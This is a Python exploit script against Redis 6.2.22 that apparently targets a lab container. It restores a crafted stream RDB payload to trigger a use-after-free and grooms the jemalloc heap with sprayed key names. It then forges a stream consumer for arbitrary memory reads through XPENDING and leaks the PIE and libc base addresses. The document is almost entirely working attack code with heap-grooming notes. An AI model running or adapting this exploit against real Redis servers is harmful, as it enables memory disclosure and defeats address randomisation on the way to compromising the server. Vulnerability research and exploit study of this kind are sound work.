#!/usr/bin/env python3
"""G2: single-free UAF -> fake streamConsumer -> arbitrary read -> PIE leak.

Primitive (redis 6.2.22, jemalloc, tcache bin24):
  * RESTORE'd stream, consumers alice/bobxx share one 24B streamNACK C
    (rdb.c bug). XGROUP DELCONSUMER alice frees C; bobxx's PEL dangles.
  * Reclaim C with a 22-byte KEY NAME sds (dbAdd sdsdup -> type5 sds,
    1+22+1 = 24 bytes, fully controlled bytes chunk[1:23]):
      name = filler7 + marker8 + P_le7   (chunk[16:24] = P, top byte NUL)
    The paired dictEntry is the crash risk (next=NULL -> consumer=NULL),
    so after each SETEX we probe with XINFO STREAM FULL (consumer-PEL
    section echoes chunk[8:16] WITHOUT dereferencing nack->consumer):
      count == marker  -> C = our key sds  -> fire XPENDING (the read)
      count == 1       -> C still stale    -> keep spraying
      count == other   -> C lost (dictEntry/rax node) -> next parity
  * Parity: pops alternate sdsdup/dictEntry; one adjuster APPEND
    (SET k 12345 + APPEND 5B -> class-24 sds, harmless content) flips it.
  * XPENDING key group - + 10 bobxx (t_stream.c:2766) echoes
    nack->consumer->name = sds at *(P+8) = arbitrary memory.
    P = fake streamConsumer in a 44B embstr value (addr via DEBUG OBJECT):
    content[0:8]=junk, [8:16]=L (read target).

Leak: Lua CClosure of string.format (addr via tostring); f=+32 is a PIE
.text pointer. sds-prefix byte at L-1 brute-forced via k (safe: sdslen
returns 0 for invalid/zero types -> empty bulk).
"""
import ctypes
import socket
import struct
import sys

import sys
HOST = sys.argv[1] if len(sys.argv) > 1 else "172.17.0.6"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7790
PW = "exploitme"
# offsets: str_format in binary, write@plt GOT slot, write in libc
def _hex_arg(i, default):
    try:
        return int(sys.argv[i], 16)
    except (IndexError, ValueError):
        return default

STR_FORMAT_OFF = _hex_arg(3, 0x1413c0)
GOT_WRITE_OFF = _hex_arg(4, 0x205170)
LIBC_WRITE_OFF = _hex_arg(5, 0xf8340)
RDB_VERSION = 9
RDB_TYPE_STREAM_LISTPACKS = 15
MARKER = b"G2MARK42"
NSPRAY = 10

from A_lib import _crc as crc  # loads libcrc64.so (with build instructions)


def rdb_len(n):
    if n < 0x40:
        return bytes([n])
    if n < 0x4000:
        return bytes([0x80 | (n >> 8), n & 0xFF])
    return b"\x81" + struct.pack(">I", n)


def rdb_str(b):
    return rdb_len(len(b)) + b


def build_payload():
    rawid = b"\x01" + b"\x00" * 15
    mstime = struct.pack("<q", 1700000000000)
    p = bytes([RDB_TYPE_STREAM_LISTPACKS])
    p += rdb_len(0)
    p += rdb_len(0)
    p += rdb_len(0) + rdb_len(0)
    p += rdb_len(1)
    p += rdb_str(b"group1")
    p += rdb_len(0) + rdb_len(0)
    p += rdb_len(1)
    p += rawid + mstime + rdb_len(1)
    p += rdb_len(2)
    for name in (b"alice", b"bobxx"):
        p += rdb_str(name)
        p += mstime
        p += rdb_len(1)
        p += rawid
    body = p + struct.pack("<H", RDB_VERSION)
    return body + struct.pack("<Q", crc.crc64(0, body, len(body)))


def encode(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return out


class Resp:
    def __init__(self, sock):
        self.sock, self.buf = sock, b""

    def _line(self):
        while b"\r\n" not in self.buf:
            chunk = self.sock.recv(1048576)
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk
        line, self.buf = self.buf.split(b"\r\n", 1)
        return line

    def _need(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(1048576)
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk

    def read(self):
        line = self._line()
        t, rest = line[:1], line[1:]
        if t in b"+-:":
            return line.decode(errors="replace")
        if t == b"$":
            n = int(rest)
            if n == -1:
                return None
            self._need(n + 2)
            data, self.buf = self.buf[:n], self.buf[n + 2:]
            return data
        if t == b"*":
            return [self.read() for _ in range(int(rest))]
        raise ValueError("bad reply %r" % line)


def cmd(r, s, *args, quiet=True):
    s.sendall(encode(*args))
    rep = r.read()
    if not quiet:
        p = rep if not isinstance(rep, (bytes, list)) else repr(rep)[:160]
        print("[redis] %-40s -> %s" % (" ".join(str(a)[:22] for a in args), p))
    if isinstance(rep, str) and rep.startswith("-ERR"):
        raise RuntimeError(rep)
    return rep


def obj_addr(r, s, key):
    info = cmd(r, s, "DEBUG", "OBJECT", key)
    return int(str(info).split("at:")[1].split()[0], 16)


def num(x):
    if isinstance(x, str) and x[:1] in ":+":
        try:
            return int(x[1:])
        except ValueError:
            return None
    return None


def xinfo_count(r, s, key):
    """delivery_count (chunk[8:16]) of the first consumer-PEL entry."""
    rep = cmd(r, s, "XINFO", "STREAM", key, "FULL")
    found = [None]

    def walk(x):
        if isinstance(x, list):
            if (len(x) == 3 and isinstance(x[0], bytes) and b"-" in x[0]
                    and num(x[1]) is not None and num(x[2]) is not None):
                found[0] = num(x[2])
            for y in x:
                walk(y)

    walk(rep)
    return found[0]


def attempt(r, s, L, j, skey, fire=True):
    """Returns (status, leak_or_info, P). status: win/lost/stale.
    fire=False skips the XPENDING echo read (crash-lottery) and just
    confirms the fake consumer is live — for callers that re-read later
    through a bounded channel.

    Spray interleaves adjuster APPENDs (1 harmless controlled pop) with
    SETEX 22-char-key (2 pops: controlled sdsdup + uncontrolled dictEntry).
    After each pair, XINFO FULL (no nack->consumer deref) tells us what
    landed on C via chunk[8:16] (delivery_count):
      MARKER        -> our key sds   -> fire XPENDING (arbitrary read)
      1             -> C still stale -> keep spraying
      0x5858585858  -> adjuster sds  -> C lost, safe, retry next stream
      other         -> dictEntry / rax node -> C lost, retry next stream
    """
    content = b"J" * 8 + struct.pack("<Q", L) + b"P" * 28
    cmd(r, s, "SETEX", "fck", "9999999", content)
    A = obj_addr(r, s, "fck")
    P = A + 19
    # adjuster keys (INT values)
    for i in range(64):
        cmd(r, s, "SET", "adj%02d" % i, "12345")
    p7 = struct.pack("<Q", P)[:7]
    # predrain tcache bin24 with harmless adjuster sds chunks
    for i in range(40):
        cmd(r, s, "APPEND", "adj%02d" % i, b"X" * 5)
    # fresh crafted stream + single free of the shared NACK
    cmd(r, s, "DEL", skey)
    rep = cmd(r, s, "RESTORE", skey, "0", build_payload())
    assert str(rep).startswith("+OK"), rep
    cmd(r, s, "XGROUP", "DELCONSUMER", skey, "group1", "alice")
    # config shift: j adjuster pops before the pure SETEX spray
    for i in range(j):
        cmd(r, s, "APPEND", "adj%02d" % (54 - i), b"X" * 5)
    # pure SETEX spray: each pops (sdsdup controlled, dictEntry uncontrolled)
    for k in range(16):
        kn = (b"g%06d" % k) + MARKER + p7
        assert len(kn) == 22
        cmd(r, s, "SET", kn, "vvvvv")
    # classify C via XINFO FULL (safe: no nack->consumer deref)
    cnt = xinfo_count(r, s, skey)
    if cnt == struct.unpack("<Q", MARKER)[0]:
        if not fire:
            return "win", None, P
        # C holds our key sds: nack->consumer == P. Fire the read.
        rep = cmd(r, s, "XPENDING", skey, "group1", "-", "+", "10", "bobxx")
        if (isinstance(rep, list) and rep and isinstance(rep[0], list)
                and len(rep[0]) == 4 and isinstance(rep[0][1], bytes)):
            return "win", rep[0][1], P
        return "win", None, P
    if cnt == 1:
        return "stale", cnt, P
    return "lost", cnt, P


def main():
    s = socket.create_connection((HOST, PORT))
    r = Resp(s)
    cmd(r, s, "AUTH", PW)
    rep = cmd(r, s, "EVAL", "return tostring(string.format)", "0")
    closure = int(str(rep).split("0x")[1].rstrip("' ").strip(), 16)
    print("[*] string.format CClosure @ %#x (f at %#x)" % (closure,
                                                         closure + 32))
    # Phase 1: get C to hold our key sds (consumer == P) once.
    win = None
    tag = 0
    for j in range(6):
        for retry in range(3):
            tag += 1
            skey = "streamkey%06d" % tag
            L = closure + 32 - 1
            print("=== align j=%d try=%d ===" % (j, retry))
            try:
                st, leak, P = attempt(r, s, L, j, skey)
            except (ConnectionError, RuntimeError, AssertionError) as e:
                print("[!] chain failed: %s" % e)
                return
            print("[*] status=%s P=%#x" % (st, P))
            if st == "win":
                win = (skey, P)
                break
        if win:
            break
    if not win:
        print("[!] never won C")
        return
    skey, P = win
    A = P - 19
    print("[+] C holds key sds; fake consumer P=%#x (robj %#x)" % (P, A))

    # Phase 2: rewrite fck in place and scan k. The embstr chunk
    # ping-pongs between two 64-class chunks; SETEX until back at A.
    import os
    klist = [int(x) for x in os.environ.get("G2KS", "3,4,5,7,8,9,10,11,12,6").split(",")]
    for k in klist:
        L = closure + 32 - k
        content = b"J" * 8 + struct.pack("<Q", L) + b"P" * 28
        A2 = None
        for _ in range(4):
            cmd(r, s, "SETEX", "fck", "9999999", content)
            A2 = obj_addr(r, s, "fck")
            if A2 == A:
                break
        if A2 != A:
            print("[!] fck never returned to %#x (last %#x)" % (A, A2))
            return
        rep = cmd(r, s, "XPENDING", skey, "group1", "-", "+", "10", "bobxx")
        leak = rep[0][1] if (isinstance(rep, list) and rep and
                             isinstance(rep[0], list)) else None
        if not isinstance(leak, bytes):
            print("k=%2d: bad reply %r" % (k, rep))
            continue
        print("k=%2d: len=%3d data=%s" % (k, len(leak), leak[:24].hex()))
        if len(leak) >= k + 8:
            f = struct.unpack("<Q", leak[k:k + 8])[0]
            print("    candidate f = %#x" % f)
            if 0x500000000000 <= f <= 0x600000000000:
                print("[+] PIE .text POINTER at k=%d: f=%#x" % (k, f))
                pie_leak = f
                break
    else:
        print("[!] no PIE leak found")
        s.close()
        return
    base = pie_leak - STR_FORMAT_OFF
    print("[+] PIE base = f - %#x = %#x" % (STR_FORMAT_OFF, base))

    # Phase 3: read write@got for a libc pointer.
    got = base + GOT_WRITE_OFF
    for k in klist:
        L = got - k
        content = b"J" * 8 + struct.pack("<Q", L) + b"P" * 28
        A2 = None
        for _ in range(4):
            cmd(r, s, "SETEX", "fck", "9999999", content)
            A2 = obj_addr(r, s, "fck")
            if A2 == A:
                break
        if A2 != A:
            print("[!] fck lost at phase 3"); return
        rep = cmd(r, s, "XPENDING", skey, "group1", "-", "+", "10", "bobxx")
        leak = rep[0][1] if (isinstance(rep, list) and rep and
                             isinstance(rep[0], list)) else None
        if not isinstance(leak, bytes):
            continue
        if len(leak) >= k + 8:
            w = struct.unpack("<Q", leak[k:k + 8])[0]
            print("k=%2d: GOT candidate = %#x" % (k, w))
            if 0x7f0000000000 <= w <= 0x800000000000:
                libc = w - LIBC_WRITE_OFF
                print("[+] LIBC leak: write=%#x -> libc base = %#x"
                      % (w, libc))
                # Phase 4: proof - read version string from PIE .rodata
                vs = base + 0x1969b0   # "6.2.22" in .rodata
                # k=11: flags byte = 0x69 -> type8, len = 0x68 = 104 (safe)
                for k in [11]:
                    L = vs - k
                    content = b"J"*8 + struct.pack("<Q", L) + b"P"*28
                    for _ in range(4):
                        cmd(r, s, "SETEX", "fck", "9999999", content)
                        A2 = obj_addr(r, s, "fck")
                        if A2 == A:
                            break
                    rep = cmd(r, s, "XPENDING", skey, "group1",
                              "-", "+", "10", "bobxx")
                    leak = rep[0][1] if (isinstance(rep, list) and rep
                                         and isinstance(rep[0], list)) else None
                    print("[*] phase4 A2=%s leak=%r" % (
                        hex(A2) if A2 else None,
                        leak[:20].hex() if isinstance(leak, bytes) else leak))
                    if isinstance(leak, bytes) and len(leak) >= k + 6:
                        frag = leak[k:k+6]
                        print("[*] .rodata read at base+%#x: %r"
                              % (0x1969b0, frag))
                        if frag == b"6.2.22":
                            print("[+] PROOF COMPLETE: version string "
                                  "read from computed PIE base")
                            s.close()
                            return
                s.close()
                return
    s.close()


if __name__ == "__main__":
    main()
